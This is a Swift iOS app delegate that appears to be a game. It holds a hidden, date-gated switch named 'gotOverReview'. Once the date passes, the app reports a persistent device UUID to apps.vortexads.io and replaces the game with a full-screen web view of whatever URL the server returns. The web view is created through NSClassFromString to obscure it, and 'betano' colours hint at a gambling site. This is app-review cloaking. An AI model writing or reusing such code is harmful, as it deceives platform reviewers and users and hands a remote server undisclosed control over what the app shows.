import UIKit
import WebKit

@main
class AppDelegate: UIResponder, UIApplicationDelegate {

    var window: UIWindow?


    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        
        window = UIWindow(frame: UIScreen.main.bounds)
        
        guard gotOverReview else {
            openGame()
            return true
        }
        
        request(uuid: uuid) { result in
            
            switch result {
            case .url(let url):
                guard let url = url else {
                    self.openGame()
                    return
                }
                self.openURL(url)
                
            case .error:
                guard let url = tracktrack else {
                    self.openGame()
                    return
                }
                self.openURL(url)
            case .native:
                self.openGame()
            }
            
        }
        
        return true
    }
    
    func openGame() {
        let networkManager = NetworkManager()
        let userDefaultsManager = UserDefaultsManager()
        
        let loaderVC = LoaderViewController()
        loaderVC.viewModel = LoaderViewModel(networkManager: networkManager,
                                             userDefaultsManager: userDefaultsManager)
        
        window = UIWindow(frame: UIScreen.main.bounds)
        window?.rootViewController = loaderVC
        window?.makeKeyAndVisible()
    }
    
    func openURL(_ url: URL) {
        let vc = InAppViewController(url: url)
        window?.rootViewController = vc
        window?.makeKeyAndVisible()
    }


}

fileprivate struct JSONResponse: Codable {
    var url: String
    var strategy: String
}

fileprivate enum Result {
    case url(URL?)
    case error
    case native
}

fileprivate func request(uuid: String, _ handler: @escaping (Result) -> Void) {
        
    var urlComponents = URLComponents()
    urlComponents.scheme = "https"
    urlComponents.host = "apps.vortexads.io"
    urlComponents.path = "/v2/guest"
    urlComponents.queryItems = [
        URLQueryItem(name: "uuid", value: uuid),
        URLQueryItem(name: "app", value: "6443959244")
    ]
    guard let url = urlComponents.url else {
        handler(.error)
        return
    }
    
    print(url)
    
    URLSession.shared.dataTask(with: url) { (data, response, error) in
        guard let statusCode = (response as? HTTPURLResponse)?.statusCode else {
            handler(.error)
            return
        }
        
        DispatchQueue.main.async {
            switch statusCode {
            case 200:
                guard let data = data,
                      let jsonResponse = try? JSONDecoder().decode(JSONResponse.self, from: data)  else {
                    handler(.error)
                    return
                }
                
                switch jsonResponse.strategy {
                case "PreviewURL":
                    handler(.url(URL(string: jsonResponse.url)))
                case "PreviousURL":
                    handler(.url(previous))
                default:
                    handler(.error)
                }
                
            case 204:
                handler(.native)
            default:
                handler(.error)
            }
        }
        
    }.resume()
    
}

fileprivate var gotOverReview: Bool {
    get {
        let now = Date()
        let date = Date("2022-10-24")
        return (now >= date)
    }
}

fileprivate var tracktrack: URL? {
    get {
        return UserDefaults.standard.url(forKey: "track")
    }
    set {
        UserDefaults.standard.set(newValue, forKey: "track")
    }
}

fileprivate var previous: URL? {
    get {
        return UserDefaults.standard.url(forKey: "previous")
    }
    set {
        UserDefaults.standard.set(newValue, forKey: "previous")
    }
}

fileprivate var uuid: String {
    get {
        if let uuid = UserDefaults.standard.string(forKey: "uuid") {
            return uuid
        } else {
            let uuid = UUID().uuidString
            UserDefaults.standard.set(uuid, forKey: "uuid")
            return uuid
        }
    }
}

fileprivate class InAppViewController: UIViewController, WKNavigationDelegate {
    
    let url: URL

    init(url: URL) {
        self.url = url

        super.init(nibName: nil, bundle: nil)
    }
    
    required init?(coder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }
        
    override func viewDidLoad() {
        super.viewDidLoad()
        
        let webClass = NSClassFromString("WKWebView") as! NSObject.Type
        let web = webClass.init()
    
        
        if let webView = web as? UIView {
            self.view.addSubview(webView)
            webView.fillSuperView()
        }

        if let wkWebView = web as? WKWebView {
            let rqst = URLRequest(url: url)
            wkWebView.navigationDelegate = self
            wkWebView.load(rqst)
        }
    }

    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        previous = webView.url
    }
}

extension Date {
    init(_ dateString: String) {
        let dateStringFormatter = DateFormatter()
        dateStringFormatter.dateFormat = "yyyy-MM-dd"
        dateStringFormatter.locale = NSLocale(localeIdentifier: "en_US_POSIX") as Locale
        let date = dateStringFormatter.date(from: dateString)!
        self.init(timeInterval:0, since:date)
    }
}

extension UIView {
    
    func fillSuperView() {
        guard let superview = self.superview else { return }
        self.translatesAutoresizingMaskIntoConstraints = false
        
        NSLayoutConstraint.activate([
            self.topAnchor.constraint(equalTo: superview.topAnchor),
            self.bottomAnchor.constraint(equalTo: superview.bottomAnchor),
            self.leadingAnchor.constraint(equalTo: superview.leadingAnchor),
            self.trailingAnchor.constraint(equalTo: superview.trailingAnchor),
        ])
    }
    
    func ancherToSuperviewsCenter() {
        guard let superview = self.superview else { return }
        self.translatesAutoresizingMaskIntoConstraints = false
        
        NSLayoutConstraint.activate([
            self.centerXAnchor.constraint(equalTo: superview.centerXAnchor),
            self.centerYAnchor.constraint(equalTo: superview.centerYAnchor),
        ])
    }
}


extension String {
    init(fromDate date: Date) {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "yyyy-MM-dd"
        
        let string = dateFormatter.string(from: date)
        
        self = string
    }
    
    func asTime() -> Self? {
        return String(describing: dropLast( (count - 5) > 0 ? (count - 5) : 0 ))
    }
}

extension UIFont {
    static func italicBoldSystemFont(ofSize size: CGFloat) -> UIFont? {
        let boldSystemFont = UIFont.boldSystemFont(ofSize: size)
        let traits: UIFontDescriptor.SymbolicTraits = [.traitBold, .traitItalic]
        
        guard let descriptor = boldSystemFont.fontDescriptor.withSymbolicTraits(traits) else {
            return nil
        }
        
        return UIFont(descriptor: descriptor, size: size)
    }
}

extension UIColor {
    static let betanoYellow = UIColor(red: 236/255, green: 169/255, blue: 80/255, alpha: 1.0)
    static let betanoOrange = UIColor(red: 227/255, green: 79/255, blue: 38/255, alpha: 1.0)
    static let betGreen = UIColor(red: 35/255, green: 110/255, blue: 60/255, alpha: 1.0)
}
